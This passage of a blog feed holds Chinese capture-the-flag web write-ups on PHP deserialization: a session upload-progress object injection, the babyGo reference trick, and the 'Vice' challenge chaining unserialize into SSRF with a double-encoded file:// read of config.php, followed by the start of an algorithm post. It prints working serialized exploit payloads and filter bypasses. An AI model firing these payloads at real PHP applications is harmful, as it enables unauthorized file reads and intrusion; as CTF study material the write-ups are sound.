class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"go"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>如果不指定，PHP 默认使用 “php“ 作为 session 序列化的方法，payload 及结果如下<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"|O:5:\"</span>OowoO\<span class="string">":1:&#123;s:4:\"</span>mdzz\<span class="string">";s:19:\"</span>print_r(<span class="variable">$_SESSION</span>);\<span class="string">";&#125;"</span></span><br><span class="line"></span><br><span class="line">Array (</span><br><span class="line">[a:<span class="number">1</span>:&#123;s:<span class="number">24</span>:<span class="string">"upload_progress_12312131"</span>;a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1551019950</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">434</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">434</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;</span><br><span class="line"> a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">55</span>:<span class="string">"] </span></span><br><span class="line"><span class="string">=&gt; OowoO Object(</span></span><br><span class="line"><span class="string">[mdzz] =&gt; print_r(<span class="variable">$_SESSION</span>);</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure></p><p>存入 <code>session</code> 里的形式是这样的，由此看出 <code>field_name</code> 也是可控的，所以不一定要用 <code>filename</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"><span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"><span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line"><span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line"><span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line"><span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line"><span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p><strong>结果如下：</strong><br><img src="https://img-blog.csdnimg.cn/20190225215921526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM0ODcwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>PS：不用纠结 <code>Content-Type</code>，这个对解题没有影响，重点是防止<code>&quot;</code> 被转义，加入<code>\</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32784/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题链接&lt;/a&gt;下面是题目给出的源码&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯 一月 web</title>
    <link href="https://wywwzjj.top/2019/01/30/%C2%96%E5%AE%89%E6%81%92%E6%9D%AF-%E4%B8%80%E6%9C%88-web/"/>
    <id>https://wywwzjj.top/2019/01/30/安恒杯-一月-web/</id>
    <published>2019-01-30T05:56:38.000Z</published>
    <updated>2019-02-28T09:05:31.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file)) &#123;             </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化题。<br>注意到一个魔术方法 <code>__toString()</code>，当 <code>echo $obj;</code> 时会自动调用。<br>第三行的 <code>include &#39;flag.php&#39;;</code> 想必 flag 就在这个文件里了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br></pre></td></tr></table></figure></p><p>只要满足这个 <code>if</code> 就能读到 <code>flag.php</code></p><p>这里有两个思路，</p><ul><li>让 <code>amzing</code> 直接为空，反序列化后<code>nice</code>依然为空，<br>得到的 <code>$this-&gt;nice-&gt;aaa</code>和 <code>$this-&gt;nice-&gt;bbb</code>自然全为 null，所以 <code>===</code>。</li><li><p>让<code>this-&gt;bbb = &amp;this-&gt;aaa</code>，随便 <code>aaa</code> 怎么变。<br>此处的 <code>exp</code> 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cc = <span class="keyword">new</span> baby();</span><br><span class="line">$cc-&gt;bbb = &amp;$cc-&gt;aaa;</span><br><span class="line">print_r(urlencode(serialize($cc)));</span><br><span class="line"><span class="comment">/* O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22s</span></span><br><span class="line"><span class="comment">ec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D */</span></span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  <span class="comment">// cool 对象</span></span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;skyobj = new sec;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;skyobj-&gt;amzing = 'O%3A4%3A%22baby%22%3A3%3A.........';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bb = <span class="keyword">new</span> baby();</span><br><span class="line">print_r(urlencode(serialize($bb)));</span><br></pre></td></tr></table></figure></li></ul><p>url 编码是必要的，避免特殊符号编码引起的长度歧义，出现 <code>Error at offset 错误</code>。<br>flag 在源代码里，记得查看。</p><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h1><p>待更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;babyGo&quot;&gt;&lt;a href=&quot;#babyGo&quot; class=&quot;headerlink&quot; title=&quot;babyGo&quot;&gt;&lt;/a&gt;babyGo&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2019 fireshell web Vice</title>
    <link href="https://wywwzjj.top/2019/01/30/2019%20%C2%96fireshell-web-Vice/"/>
    <id>https://wywwzjj.top/2019/01/30/2019 fireshell-web-Vice/</id>
    <published>2019-01-30T05:52:46.000Z</published>
    <updated>2019-02-28T09:03:55.473Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目所给源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//require_once 'config.php';</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHITS</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $url;</span><br><span class="line"><span class="keyword">private</span> $method;</span><br><span class="line"><span class="keyword">private</span> $addr;</span><br><span class="line"><span class="keyword">private</span> $host;</span><br><span class="line"><span class="keyword">private</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method,$url)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"><span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doit</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = @parse_url(<span class="keyword">$this</span>-&gt;url)[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;addr = @gethostbyname(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = @gethostbyaddr(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;addr !== <span class="string">"127.0.0.1"</span> || <span class="keyword">$this</span>-&gt;name === <span class="keyword">false</span>)&#123;</span><br><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">$p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line"><span class="keyword">if</span>($p)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">"doit"</span>)))&#123;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">array</span>());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"gg"</span>])) &#123;</span><br><span class="line">@unserialize($_GET[<span class="string">"gg"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开 <code>config.php</code> ，出现 awn…<br>猜想 <code>flag</code> 在 <code>config.php</code> 中，并且有访问限制，构造 <code>ssrf</code> 进行访问，然而还是啥都没有，与外网直接访问的界面一样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">    $p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">    <span class="keyword">if</span>($p)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处可构造   <a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">绕过方法参考</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@68.183.31.62:991/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@localhost/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'localhost/config%2ephp'</span>);</span><br><span class="line">$ser = serialize($gg);</span><br><span class="line"><span class="keyword">echo</span> urlencode($ser) .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($ser);</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>SHITS%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>url%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22.</span>php%<span class="number">4068.183</span><span class="number">.31</span><span class="number">.62</span>%<span class="number">3</span>A991%<span class="number">2</span>Fco</span><br><span class="line">nfig.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>method%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>doit%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>addr%<span class="number">22</span>%<span class="number">3</span>B</span><br><span class="line">N%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></p><p>先URL编码，若序列化后直接反序列化，某些特殊符号的编码问题会引起<code>length</code>混乱，出现 <code>unserialize(): Error at offset 错误</code>，<br>也可以进行其他的编码，比如 base64，但是需要改代码，这里利用 web 特性，<code>url 编码</code>最方便</p><p>但是并没有什么卵用</p><p>还是得 <code>file:///var/www/html/config%2ephp</code> 二次编码绕过 <code>.</code></p><p><strong>exp</strong>：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>SHITS<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">10</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>url<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">33</span><span class="symbol">%3</span>A<span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fvar<span class="symbol">%2</span>Fwww</span><br><span class="line"><span class="symbol">%2</span>Fhtml<span class="symbol">%2</span>Fconfig<span class="symbol">%252</span>ephp<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>method<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>doit<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span></span><br><span class="line"><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>addr<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>host<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>name<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure></p><p>读取 <code>config.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'::1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aaawn"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$flag =<span class="string">"F#&#123;wtf_5trp0s_&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>观察代码，此处的 <code>||</code>，能到 else 吗，出题人真阴险 :)</p><p>其实可以这样，不需要所有属性，只要前两个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目所给源码&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="ssrf" scheme="https://wywwzjj.top/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>POJ-2352 Stars【树状数组】</title>
    <link href="https://wywwzjj.top/2019/01/02/%C2%96POJ-2352-Stars%E3%80%90%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E3%80%91/"/>
    <id>https://wywwzjj.top/2019/01/02/POJ-2352-Stars【树状数组】/</id>
    <published>2019-01-02T01:52:33.000Z</published>
    <updated>2019-02-26T10:29:50.284Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://poj.org/problem?id=2352" target="_blank" rel="noopener">原题链接</a><br> <strong>题目大意</strong><br>  给出一些星星的二维坐标，求星星左方，下方，左下方的星星个数。</p><p><strong>思路</strong><br>题目已经把星星按照 y 坐标从小到大排序，若 y 相等则按 x 从小到大排序。因此，在每次对一个星星进行统计时，之前出现过的星星，只要 x 坐标比其小，则必在其左，左下方，x 坐标相等的自然在下方。</p><p><strong>代码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 